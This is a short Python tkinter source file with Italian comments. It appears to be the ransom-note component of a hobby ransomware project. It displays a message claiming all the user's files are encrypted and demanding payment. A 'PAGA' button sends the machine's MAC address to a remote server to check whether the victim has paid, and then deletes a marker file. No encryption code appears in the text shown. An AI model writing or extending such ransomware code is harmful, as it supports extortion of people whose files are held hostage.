# importa il modulo
from tkinter import *
import os
from uuid import getnode as get_mac

import request

# costruisce una classe che gestisce la finestra
class Application(Frame):

    # metodo costruttore che crea gli oggetti grafici
    def __init__(self, master=None):
        f = Frame(master)
        f.pack()

        # crea il bottone di uscita (di colore rosso)
        self.esci = Button(f)
        self.esci["text"] = "CHIUDI"
        self.esci["bg"] = "red"
        self.esci["fg"] = "white"
        self.esci["command"] = f.quit
        self.esci.pack({"side": "bottom"})

        # crea il bottone di uscita (di colore rosso)
        self.paga = Button(f)
        self.paga["text"] = "PAGA"
        self.paga["bg"] = "blue"
        self.paga["fg"] = "white"
        self.paga["command"] = self.payTheBucks
        self.paga.pack({"side": "bottom"})

        # crea l'oggetto grafico che contiene il messaggio
        self.mess = Message(f)
        self.mess["text"] = "TUTTI I TUOI FILE SONO CRITTATI! VUOI PAGARE 1000MILA SOLDI?"
        self.mess.pack({"side": "top"})


    def payTheBucks(self):
        # Send to Server Payment Request
        # Create the Request
        # MAC Address
        mac = str ( ':'.join(("%012X" % get_mac() )[i:i + 2] for i in range(0, 12, 2)))
        req = request.Request({"r": "IfUserPayed", "MAC": mac})

        # REQUEST TO SERVER
        resp = req.CustomPostRequest(req.getData(), req.getUrl(), req.getHeaders())
        print "IfUserPayed"
        print resp

        if os.path.isfile("check.check"):
            os.remove("check.check")
        self.mess["text"] = "OTTIMA SCELTA! CHIUDI E RIAVVIA QUESTA APPLICAZIONE"
